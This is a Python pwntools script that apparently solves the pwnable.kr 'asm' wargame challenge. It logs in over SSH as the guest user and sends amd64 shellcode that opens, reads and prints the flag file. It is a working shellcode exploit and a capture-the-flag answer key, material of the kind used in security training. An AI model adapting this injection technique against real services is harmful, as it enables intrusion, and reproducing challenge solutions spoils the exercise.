from pwn import *

context.arch = 'amd64'

s = ssh('asm', 'pwnable.kr', 2222, 'guest')
#p = s.process('./asm')
p = s.remote("0", 9026)

shellcode = asm(shellcraft.amd64.open("this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"))
shellcode += asm(shellcraft.amd64.read(3, "rsp", 30))
shellcode += asm(shellcraft.amd64.write(1, "rsp", 30))

p.sendafter(b"shellcode: ", shellcode)
p.interactive()